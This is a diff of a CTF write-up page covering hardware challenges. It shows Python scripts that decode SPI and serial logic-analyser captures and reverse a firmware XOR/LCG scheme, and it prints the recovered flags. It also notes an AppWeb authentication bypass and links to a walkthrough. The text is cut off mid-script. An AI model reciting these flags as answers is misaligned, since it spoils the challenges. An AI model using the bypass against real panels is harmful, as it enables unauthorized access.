-<img src=media/OffTheGridSaleae.png alt="SPI Settings used" loading=lazy>
-</p>
-<p>Taking a look at how the data is transferred, we can see that there are 6 distinct &ldquo;pulses&rdquo; of data, indicating the number of different displays.
+Bearing in mind that the dimensions of the OLED screen are 128x64, meaning we will have 8 pages per screen.</p><p>Now that we know how the OLED screen will work, it&rsquo;s time to extract the data from the Saleae capture, and get our flag.</p><p>As we know that the transfer protocol used was SPI, we can simply let a Saleae analyser give the required bits for us. We set the MOSI (or MISO, makes no difference in this case) as the data we want to get (Channel 0), our good old clock (Channel 1), and the enable line (Channel 3) which tells us when to sample our DIN. We set the enable line to active high, since when Channel 3 (D/C) is high, that&rsquo;s when data is being written into GDDRAM.
+<img src=media/OffTheGridSaleae.png alt="SPI Settings used" loading=lazy></p><p>Taking a look at how the data is transferred, we can see that there are 6 distinct &ldquo;pulses&rdquo; of data, indicating the number of different displays.
 <img src=media/OffTheGridScreenByScreen.png alt="6 clear blips of data" loading=lazy>
 And within those pulses, there are 8 distinct blocks of data being sent to the GDDRAM, showing how data is sent page by page.
-<img src=media/OffTheGridPageByPage.png alt="Pages within each of the 6 blips" loading=lazy>
-</p>
-<p>This gives us a good idea on how to write a simple script to turn all our bits to a bitmappable image. Although it&rsquo;s possible to use PIL to convert our bits straight to a bmp file, I like to export the bytes as .data, then open it up in GIMP to get the full picture. After some <a href=#theres-an-imposter-among-us target=_blank rel=noreferrer>debugging</a>
-, we finally have a successful script.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=color:#f92672>import</span> csv
-<span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
-
-PAGE_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>128</span>
-BYTE_TO_BIT <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>
-SCREEN_SIZE <span style=color:#f92672>=</span> PAGE_SIZE <span style=color:#f92672>*</span> <span style=color:#ae81ff>64</span> <span style=color:#75715e># 128x64 bit screen</span>
-
-screens <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>]
-output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-bit_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-screen_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;bits_out.txt&#39;</span>) <span style=color:#66d9ef>as</span> csv_file:
-    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,&#39;</span>)
-    <span style=color:#75715e># ignore header</span>
-    next(csv_reader)
-    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
-    <span style=color:#75715e># Format is timstamp - ID - DIN</span>
-        din <span style=color:#f92672>=</span> row[<span style=color:#ae81ff>2</span>]
-        <span style=color:#75715e># reformat to make binary look nicer and easier to work with</span>
-        din <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(din<span style=color:#f92672>.</span>split())[<span style=color:#ae81ff>2</span>:]
-        output <span style=color:#f92672>+=</span> din
-        bit_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>8</span>
-
-        <span style=color:#75715e># convert output to page format then clear output</span>
-        <span style=color:#66d9ef>if</span> bit_count <span style=color:#f92672>%</span> SCREEN_SIZE <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> output:
-            <span style=color:#75715e># split into pages</span>
-            <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
-                page <span style=color:#f92672>=</span> output[i <span style=color:#f92672>*</span> PAGE_SIZE <span style=color:#f92672>*</span> BYTE_TO_BIT: (i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> PAGE_SIZE <span style=color:#f92672>*</span> BYTE_TO_BIT]
-                <span style=color:#75715e># d7 in index 7, d6 in index 6 etc.</span>
-                <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
-                    screens[screen_index] <span style=color:#f92672>+=</span> page[<span style=color:#ae81ff>7</span><span style=color:#f92672>-</span>j::<span style=color:#ae81ff>8</span>]
-            output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-            screen_index <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-
-<span style=color:#75715e># write each screen as bits to a file</span>
-file <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;screendata.data&#34;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>)
-<span style=color:#66d9ef>for</span> screen <span style=color:#f92672>in</span> screens:
-    file<span style=color:#f92672>.</span>write(long_to_bytes(int(screen,<span style=color:#ae81ff>2</span>)))
-file<span style=color:#f92672>.</span>close()
-</code></pre></div><p>Now open our final image through GIMP, and we have our flag!
+<img src=media/OffTheGridPageByPage.png alt="Pages within each of the 6 blips" loading=lazy></p><p>This gives us a good idea on how to write a simple script to turn all our bits to a bitmappable image. Although it&rsquo;s possible to use PIL to convert our bits straight to a bmp file, I like to export the bytes as .data, then open it up in GIMP to get the full picture. After some <a href=#theres-an-imposter-among-us target=_blank rel=noreferrer>debugging</a>
+, we finally have a successful script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#f92672>import</span> csv
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PAGE_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>128</span>
+</span></span><span style=display:flex><span>BYTE_TO_BIT <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>
+</span></span><span style=display:flex><span>SCREEN_SIZE <span style=color:#f92672>=</span> PAGE_SIZE <span style=color:#f92672>*</span> <span style=color:#ae81ff>64</span> <span style=color:#75715e># 128x64 bit screen</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>screens <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>]
+</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>bit_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>screen_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;bits_out.txt&#39;</span>) <span style=color:#66d9ef>as</span> csv_file:
+</span></span><span style=display:flex><span>    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ignore header</span>
+</span></span><span style=display:flex><span>    next(csv_reader)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Format is timstamp - ID - DIN</span>
+</span></span><span style=display:flex><span>        din <span style=color:#f92672>=</span> row[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>        <span style=color:#75715e># reformat to make binary look nicer and easier to work with</span>
+</span></span><span style=display:flex><span>        din <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(din<span style=color:#f92672>.</span>split())[<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span>        output <span style=color:#f92672>+=</span> din
+</span></span><span style=display:flex><span>        bit_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>8</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># convert output to page format then clear output</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> bit_count <span style=color:#f92672>%</span> SCREEN_SIZE <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> output:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># split into pages</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
+</span></span><span style=display:flex><span>                page <span style=color:#f92672>=</span> output[i <span style=color:#f92672>*</span> PAGE_SIZE <span style=color:#f92672>*</span> BYTE_TO_BIT: (i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> PAGE_SIZE <span style=color:#f92672>*</span> BYTE_TO_BIT]
+</span></span><span style=display:flex><span>                <span style=color:#75715e># d7 in index 7, d6 in index 6 etc.</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
+</span></span><span style=display:flex><span>                    screens[screen_index] <span style=color:#f92672>+=</span> page[<span style=color:#ae81ff>7</span><span style=color:#f92672>-</span>j::<span style=color:#ae81ff>8</span>]
+</span></span><span style=display:flex><span>            output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>            screen_index <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># write each screen as bits to a file</span>
+</span></span><span style=display:flex><span>file <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;screendata.data&#34;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> screen <span style=color:#f92672>in</span> screens:
+</span></span><span style=display:flex><span>    file<span style=color:#f92672>.</span>write(long_to_bytes(int(screen,<span style=color:#ae81ff>2</span>)))
+</span></span><span style=display:flex><span>file<span style=color:#f92672>.</span>close()
+</span></span></code></pre></div><p>Now open our final image through GIMP, and we have our flag!
 <img src=media/OffTheGridFlag.png alt="Screenshot of flag in dodgy recreation of the LED screen" loading=lazy>
-<code>CHTB{013d_h4ck1n9_f7w!2^25#}</code></p>
-<h3 id=hidden>Hidden</h3>
-<img src=media/HiddenDescription.png alt="Challenge info for Hidden" loading=lazy>
-<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_hidden.zip target=_blank rel=noreferrer>Download the challenge</a>
-<p>This challenge added a nice touch of rev and some <em>bits</em> of guessing. Most of that knowledge courtesy of <a href=https://jsur.in target=_blank rel=noreferrer>genius teammate</a>
-.</p>
-<p>Let&rsquo;s look at the firmware first. Opening the .ELF file in Ghidra gives us a good idea as to what&rsquo;s happening.</p>
-<ol>
-<li>We have some sort of XOR encryption going on<br>
-<img src=media/HiddenXOR.png alt="XOR function in Ghidra" loading=lazy>
-</li>
-<li>Building on that, there&rsquo;s a pseudo-random key generator, using <a href=https://en.wikipedia.org/wiki/Linear_congruential_generator target=_blank rel=noreferrer>LCG algorithm</a>
+<code>CHTB{013d_h4ck1n9_f7w!2^25#}</code></p><h3 id=hidden>Hidden</h3><img src=media/HiddenDescription.png alt="Challenge info for Hidden" loading=lazy>
+<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_hidden.zip target=_blank rel=noreferrer>Download the challenge</a><p>This challenge added a nice touch of rev and some <em>bits</em> of guessing. Most of that knowledge courtesy of <a href=https://jsur.in target=_blank rel=noreferrer>genius teammate</a>
+.</p><p>Let&rsquo;s look at the firmware first. Opening the .ELF file in Ghidra gives us a good idea as to what&rsquo;s happening.</p><ol><li>We have some sort of XOR encryption going on<br><img src=media/HiddenXOR.png alt="XOR function in Ghidra" loading=lazy></li><li>Building on that, there&rsquo;s a pseudo-random key generator, using <a href=https://en.wikipedia.org/wiki/Linear_congruential_generator target=_blank rel=noreferrer>LCG algorithm</a>
 . We get that our seed is <code>0x2e9d3</code>(from next_in_seq), the multiplier is <code>0x303577d</code>, the increment is <code>0x145a</code>, and the modulus is <code>0xff</code>.
-<img src=media/HiddenKeyGen.png alt="Exactly what was said above but in Ghidra" loading=lazy>
-</li>
-<li>Prior to being written, there&rsquo;s a small little operation done to the encoded data.
-<img src=media/HiddenPreWrite.png alt="Sneaky little step done to encoded things, shown in Ghidra" loading=lazy>
-</li>
-</ol>
-<p>Putting it all together, we can figure out what&rsquo;s happening to the flag:
-Each byte of the flag (0x32, meaning a total of 50 bytes) is XOR&rsquo;d with a different value determined by the pseudo-random key generator. Then, before it&rsquo;s written to the output file, the value is split into two, with the first half containing the first 4 MSB of the byte, plus 1, and the second half containing the next (and last) 4, also plus 1.</p>
-<p>Now we can begin the bit extraction.</p>
-<p>Opening up the .sal file on our favourite logic analyser, all signs seemed to indicate that the data was being delivered using async serial (no clock, each gap between a fall and the next rise was a multiple of roughly the same time). However, attempts at getting the logic analyser to play nice didn&rsquo;t seem to work, with hundreds upon hundreds of (framing) errors being thrown at my face. This meant we&rsquo;d have to extract all the bits ourselves. Luckily this isn&rsquo;t too difficult.</p>
-<p>When exporting the data as a CSV (using Saleae&rsquo;s default exporter), we can see that we&rsquo;re told when the signal changes, and what it&rsquo;s changed to (in channel 0, where the important data lies).
+<img src=media/HiddenKeyGen.png alt="Exactly what was said above but in Ghidra" loading=lazy></li><li>Prior to being written, there&rsquo;s a small little operation done to the encoded data.
+<img src=media/HiddenPreWrite.png alt="Sneaky little step done to encoded things, shown in Ghidra" loading=lazy></li></ol><p>Putting it all together, we can figure out what&rsquo;s happening to the flag:
+Each byte of the flag (0x32, meaning a total of 50 bytes) is XOR&rsquo;d with a different value determined by the pseudo-random key generator. Then, before it&rsquo;s written to the output file, the value is split into two, with the first half containing the first 4 MSB of the byte, plus 1, and the second half containing the next (and last) 4, also plus 1.</p><p>Now we can begin the bit extraction.</p><p>Opening up the .sal file on our favourite logic analyser, all signs seemed to indicate that the data was being delivered using async serial (no clock, each gap between a fall and the next rise was a multiple of roughly the same time). However, attempts at getting the logic analyser to play nice didn&rsquo;t seem to work, with hundreds upon hundreds of (framing) errors being thrown at my face. This meant we&rsquo;d have to extract all the bits ourselves. Luckily this isn&rsquo;t too difficult.</p><p>When exporting the data as a CSV (using Saleae&rsquo;s default exporter), we can see that we&rsquo;re told when the signal changes, and what it&rsquo;s changed to (in channel 0, where the important data lies).
 <img src=media/HiddenCSV.png alt="CSV output of Saleae capture" loading=lazy>
 Noting the approximate time a single bit is represented (in this case, approximately 17us), which can be seen by looking at the smallest gap between a rise and fall of a signal (or fall and rise). Longer signal lengths should be a multiple of this.
-<img src=media/HiddenSaleaeAnalysis.gif alt="Careful analysis involving moving the mouse very slowly over the Saleae capture" loading=lazy>
-</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> csv
-<span style=color:#75715e># arbitrary number to skip the initial/end high signals</span>
-MAX_GAP <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
-<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;digital.csv&#39;</span>) <span style=color:#66d9ef>as</span> csv_file:
-    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
-    last_time <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-    last_bit <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span>
-    <span style=color:#75715e># skip headers</span>
-    next(csv_reader)
-    output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-    <span style=color:#66d9ef>for</span> time,data,dud <span style=color:#f92672>in</span> csv_reader:
-        time <span style=color:#f92672>=</span> float(time)
-        <span style=color:#75715e># get gap in us</span>
-        gap <span style=color:#f92672>=</span> (float(time) <span style=color:#f92672>-</span> last_time) <span style=color:#f92672>*</span> (<span style=color:#ae81ff>10</span><span style=color:#f92672>**</span><span style=color:#ae81ff>6</span>)
-
-        <span style=color:#75715e># use gap between previous and current time to get # of bits</span>
-        <span style=color:#75715e># every ~17us time gap is 1 bit, assume max gap is 200us</span>
-        <span style=color:#66d9ef>if</span> gap <span style=color:#f92672>&lt;</span> MAX_GAP:
-            bits <span style=color:#f92672>=</span> gap <span style=color:#f92672>//</span> <span style=color:#ae81ff>17</span>
-            output <span style=color:#f92672>+=</span> int(bits) <span style=color:#f92672>*</span> last_bit
-
-        last_time <span style=color:#f92672>=</span> time
-        last_bit <span style=color:#f92672>=</span> data
-print(output)
-</code></pre></div><p>Now based on the firmware, we&rsquo;re expecting there to be about (50 * (8+2)) = 500 bits (50 bytes of the flag * (8 bits per byte + 2 from the two extra +1&rsquo;s before the encoded data was outputted)). Instead, we&rsquo;re greeted with 3598 bits&mldr; strange. This is where some of the guessing begins.</p>
-<p>Given that there wasn&rsquo;t a clock, nor an obvious enable signal to indicate when the transmission starts/ends, it&rsquo;s possible that the bits we had received also start/end with some number of 1&rsquo;s, since the signal started and ended with very long high signals.</p>
-<p><code>011010111000000011000000011000000011010100011000000011000000011000000011001000111000000011000000011000000011011010111000000011000000011000000011</code><br>
-Looking at this small selection of the bitstream, it&rsquo;s very clearly there&rsquo;s some sort of pattern going on, namely the repeat of <code>000000011</code> three times, surrounding some bits of random 1&rsquo;s and 0&rsquo;s.<br>
-Based on this, we can break the stream into sections of 9. Given that 3598 isn&rsquo;t divisible by 9, we can deduce that there are 2 1&rsquo;s at either the start or the end of the bitstream. Initially, we tried to put two 1&rsquo;s at the end of the bitstream, however, that resulted in groups of binaries that made little sense. When we tried to put two 1&rsquo;s at the start of the bitstream, things made a bit more sense. Upon doing so, everything started with a <code>110</code>. Given that there were lots of <code>110000000</code> (now that the two 1&rsquo;s were added at the start, the repeated groups weren&rsquo;t <code>000000011</code> anymore), we can safely ignore these.</p>
-<p>With the bits all extracted and thoroughly examined, all we have left to do now, is reverse what&rsquo;s happening in the firmware in our code, and hopefully get our flag. However, we got errors telling us the bytes were larger than 256. As it turns out, endianness was at play here, and reversing each byte managed to solve the issue.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> xor
-<span style=color:#f92672>from</span> ctypes <span style=color:#f92672>import</span> c_uint
-
-GROUP_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>9</span>
-
-bits <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;bits.txt&#39;</span>)<span style=color:#f92672>.</span>read()
-bits <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;11&#39;</span> <span style=color:#f92672>+</span> bits
-bits_list <span style=color:#f92672>=</span> []
-
-<span style=color:#75715e># split bits into groups of 9 then add to list</span>
-<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,len(bits)<span style=color:#f92672>//</span>GROUP_SIZE):
-    group <span style=color:#f92672>=</span> bits[(i<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>GROUP_SIZE:i<span style=color:#f92672>*</span>GROUP_SIZE]
-    <span style=color:#75715e># ignore the repeated groups of 110000000</span>
-    <span style=color:#66d9ef>if</span> group <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;110000000&#39;</span>:
-        bits_list<span style=color:#f92672>.</span>append(group)
-
-<span style=color:#75715e># The LCG algorithm used to generate the XOR keys</span>
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>lcg</span>():
-    seed <span style=color:#f92672>=</span> c_uint(<span style=color:#ae81ff>0x2e9d3</span>)
-    <span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
-        seed <span style=color:#f92672>=</span> c_uint(seed<span style=color:#f92672>.</span>value <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x303577d</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x145a</span>)
-        <span style=color:#66d9ef>yield</span> seed<span style=color:#f92672>.</span>value <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xff</span>
-
-ciphertext <span style=color:#f92672>=</span> bytearray()
-<span style=color:#75715e># Reversing what&#39;s being done in the firmware</span>
-<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(bits_list), <span style=color:#ae81ff>2</span>):
-    c1, c2 <span style=color:#f92672>=</span> int(bits_list[i][<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>6</span>], <span style=color:#ae81ff>2</span>) , int(bits_list[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>6</span>], <span style=color:#ae81ff>2</span>)
-    x1, x2 <span style=color:#f92672>=</span> c1<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, c2<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
-    b <span style=color:#f92672>=</span> (x1 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> x2
-    ciphertext<span style=color:#f92672>.</span>append(b)
-
-<span style=color:#75715e># The XOR and flag</span>
-L <span style=color:#f92672>=</span> lcg()
-xor_key <span style=color:#f92672>=</span> bytearray([next(L) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> ciphertext])
-plaintext <span style=color:#f92672>=</span> xor(xor_key, ciphertext)
-print(plaintext<span style=color:#f92672>.</span>decode())
-
-</code></pre></div><p>And just like that, we get our flag!
-<code>CHTB{10w_13v31_f12mw4235_741ks_70_h42dw423_!@3418}</code></p>
-<h3 id=discovery>Discovery</h3>
-<img src=media/DiscoveryDescription.png alt="Challenge info for Discovery" loading=lazy>
-<p>This challenge was certainly challenging. I never got to solve it during the competition period, however, upon looking at solutions, this one is a very fun one to explore (fun is not guaranteed).</p>
-<p>Unlike the other hardware challenges, this not only didn&rsquo;t involve Saleae, but also had not just one, but two docker instances we could connect to. The URL and port is different for everyone, but what lies beyond is the same. We are given to IPs:</p>
-<ul>
-<li>One is an AppWeb panel (and asks us for a username or password)</li>
-<li>The other is an AMQP server (although we can&rsquo;t connect through a web browser, the response headers tell us that it&rsquo;s using the AMQP protocol)</li>
-</ul>
-<p>Despite a lot of begging and pleading, there didn&rsquo;t seem to be any way past the authentication on the AppWeb panel.</p>
-<p>As it turns out, the entirety of the authentication can by bypassed given that we know the username. A step by step walkthrough of how it works can be found <a href=https://lab.wallarm.com/can-your-printer-hack-your-secrets-appweb-authorization-bypass-c609cf9024a7/ target=_blank rel=noreferrer>here</a>
+<img src=media/HiddenSaleaeAnalysis.gif alt="Careful analysis involving moving the mouse very slowly over the Saleae capture" loading=lazy></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> csv
+</span></span><span style=display:flex><span><span style=color:#75715e># arbitrary number to skip the initial/end high signals</span>
+</span></span><span style=display:flex><span>MAX_GAP <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;digital.csv&#39;</span>) <span style=color:#66d9ef>as</span> csv_file:
+</span></span><span style=display:flex><span>    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    last_time <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    last_bit <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># skip headers</span>
+</span></span><span style=display:flex><span>    next(csv_reader)
+</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> time,data,dud <span style=color:#f92672>in</span> csv_reader:
+</span></span><span style=display:flex><span>        time <span style=color:#f92672>=</span> float(time)
+</span></span><span style=display:flex><span>        <span style=color:#75715e># get gap in us</span>
+</span></span><span style=display:flex><span>        gap <span style=color:#f92672>=</span> (float(time) <span style=color:#f92672>-</span> last_time) <span style=color:#f92672>*</span> (<span style=color:#ae81ff>10</span><span style=color:#f92672>**</span><span style=color:#ae81ff>6</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># use gap between previous and current time to get # of bits</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># every ~17us time gap is 1 bit, assume max gap is 200us</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> gap <span style=color:#f92672>&lt;</span> MAX_GAP:
+</span></span><span style=display:flex><span>            bits <span style=color:#f92672>=</span> gap <span style=color:#f92672>//</span> <span style=color:#ae81ff>17</span>
+</span></span><span style=display:flex><span>            output <span style=color:#f92672>+=</span> int(bits) <span style=color:#f92672>*</span> last_bit
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        last_time <span style=color:#f92672>=</span> time
+</span></span><span style=display:flex><span>        last_bit <span style=color:#f92672>=</span> data
+</span></span><span style=display:flex><span>print(output)
+</span></span></code></pre></div><p>Now based on the firmware, we&rsquo;re expecting there to be about (50 * (8+2)) = 500 bits (50 bytes of the flag * (8 bits per byte + 2 from the two extra +1&rsquo;s before the encoded data was outputted)). Instead, we&rsquo;re greeted with 3598 bits&mldr; strange. This is where some of the guessing begins.</p><p>Given that there wasn&rsquo;t a clock, nor an obvious enable signal to indicate when the transmission starts/ends, it&rsquo;s possible that the bits we had received also start/end with some number of 1&rsquo;s, since the signal started and ended with very long high signals.</p><p><code>011010111000000011000000011000000011010100011000000011000000011000000011001000111000000011000000011000000011011010111000000011000000011000000011</code><br>Looking at this small selection of the bitstream, it&rsquo;s very clearly there&rsquo;s some sort of pattern going on, namely the repeat of <code>000000011</code> three times, surrounding some bits of random 1&rsquo;s and 0&rsquo;s.<br>Based on this, we can break the stream into sections of 9. Given that 3598 isn&rsquo;t divisible by 9, we can deduce that there are 2 1&rsquo;s at either the start or the end of the bitstream. Initially, we tried to put two 1&rsquo;s at the end of the bitstream, however, that resulted in groups of binaries that made little sense. When we tried to put two 1&rsquo;s at the start of the bitstream, things made a bit more sense. Upon doing so, everything started with a <code>110</code>. Given that there were lots of <code>110000000</code> (now that the two 1&rsquo;s were added at the start, the repeated groups weren&rsquo;t <code>000000011</code> anymore), we can safely ignore these.</p><p>With the bits all extracted and thoroughly examined, all we have left to do now, is reverse what&rsquo;s happening in the firmware in our code, and hopefully get our flag. However, we got errors telling us the bytes were larger than 256. As it turns out, endianness was at play here, and reversing each byte managed to solve the issue.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> xor
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> ctypes <span style=color:#f92672>import</span> c_uint
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GROUP_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>9</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>bits <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;bits.txt&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>bits <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;11&#39;</span> <span style=color:#f92672>+</span> bits
+</span></span><span style=display:flex><span>bits_list <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># split bits into groups of 9 then add to list</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,len(bits)<span style=color:#f92672>//</span>GROUP_SIZE):
+</span></span><span style=display:flex><span>    group <span style=color:#f92672>=</span> bits[(i<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>GROUP_SIZE:i<span style=color:#f92672>*</span>GROUP_SIZE]
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ignore the repeated groups of 110000000</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> group <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;110000000&#39;</span>:
+</span></span><span style=display:flex><span>        bits_list<span style=color:#f92672>.</span>append(group)
+</span></span><span style=display:flex><span>
